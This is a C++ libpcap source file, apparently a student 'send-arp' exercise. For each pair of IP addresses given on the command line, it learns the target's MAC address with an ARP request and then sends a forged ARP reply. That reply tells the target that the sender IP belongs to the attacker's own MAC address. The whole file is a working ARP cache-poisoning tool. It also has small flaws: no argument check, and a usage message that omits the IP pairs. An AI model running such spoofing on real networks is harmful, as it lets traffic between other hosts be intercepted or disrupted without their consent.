#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>

#define MAC_ALEN 6
#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}


int GetMacAddress(char *ifname, uint8_t *mac_addr)
{
	struct ifreq ifr;
	int sockfd, ret;
	sockfd = socket(AF_INET, SOCK_DGRAM,0);
	if(sockfd<0){
		printf("Fail to get interface MAC address\n");
		return -1;
	}
	strncpy(ifr.ifr_name,ifname,IFNAMSIZ);
	ret = ioctl(sockfd,SIOCGIFHWADDR,&ifr);
	if (ret < 0){
		printf("Fail to get interface MAC address\n");
		return -1;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data,MAC_ALEN);
	
	close(sockfd);
	return 0;
}


int main(int argc, char* argv[]) {
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	uint8_t my_mac_addr[MAC_ALEN];
	GetMacAddress(argv[1],my_mac_addr); //get mac address 
	for (int i = 0 ; i < (argc - 2)/2;i++){
	
		EthArpPacket req_packet;
		req_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		req_packet.eth_.smac_ = my_mac_addr;
		/*	req_packet.eth_.smac_[0]=my_mac_addr[0];
		req_packet.eth_.smac_[1]=my_mac_addr[1];
		req_packet.eth_.smac_[2]=my_mac_addr[2];
		req_packet.eth_.smac_[3]=my_mac_addr[3];
		req_packet.eth_.smac_[4]=my_mac_addr[4];
		req_packet.eth_.smac_[5]=my_mac_addr[5];
	*/	req_packet.eth_.type_ = htons(EthHdr::Arp);
	
		req_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		req_packet.arp_.pro_ = htons(EthHdr::Ip4);
		req_packet.arp_.hln_ = Mac::SIZE;
		req_packet.arp_.pln_ = Ip::SIZE;
		req_packet.arp_.op_ = htons(ArpHdr::Request);
		req_packet.arp_.smac_ = my_mac_addr;
		req_packet.arp_.sip_ = htonl(Ip(argv[i*2 + 3]));
		req_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		req_packet.arp_.tip_ = htonl(Ip(argv[i*2 + 2]));
	
	
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req_packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		while (true){
			struct pcap_pkthdr* header;
			const u_char* packet;
			EthArpPacket *rep_packet;	
			int res = pcap_next_ex(handle, &header, &packet);
			if(res == 0) continue;
			if(res == -1||res == -2){
				printf("pcap_next_ex return %d(%s)\n",res,pcap_geterr(handle));
				break;
			}
			rep_packet = (EthArpPacket*)packet;
			if (rep_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
			if (rep_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
			//printf("%02x:%02x:%02x:%02x:%02x:%02x\n",rep_packet->arp_.smac_[0],rep_packet->arp_.smac_[1],rep_packet->arp_.smac_[2],rep_packet->arp_.smac_[3],rep_packet->arp_.smac_[4],rep_packet->arp_.smac_[5]);
			
			EthArpPacket spf_packet;
	        	spf_packet.eth_.dmac_ = rep_packet->arp_.smac_ ;
	        	spf_packet.eth_.smac_ = my_mac_addr;
	                spf_packet.eth_.type_ = htons(EthHdr::Arp);
	
	        	spf_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	        	spf_packet.arp_.pro_ = htons(EthHdr::Ip4);
	        	spf_packet.arp_.hln_ = Mac::SIZE;
	        	spf_packet.arp_.pln_ = Ip::SIZE;
	        	spf_packet.arp_.op_ = htons(ArpHdr::Reply);
	        	spf_packet.arp_.smac_ = my_mac_addr;
	        	spf_packet.arp_.sip_ = htonl(Ip(argv[i*2 + 3]));
	        	spf_packet.arp_.tmac_ = rep_packet->arp_.smac_ ;
	        	spf_packet.arp_.tip_ = htonl(Ip(argv[i*2 + 2]));
		

        		int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spf_packet), sizeof(EthArpPacket));
        		if (res2 != 0) {
        	        	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        		}
				
			break;
		}
	}



	pcap_close(handle);
}
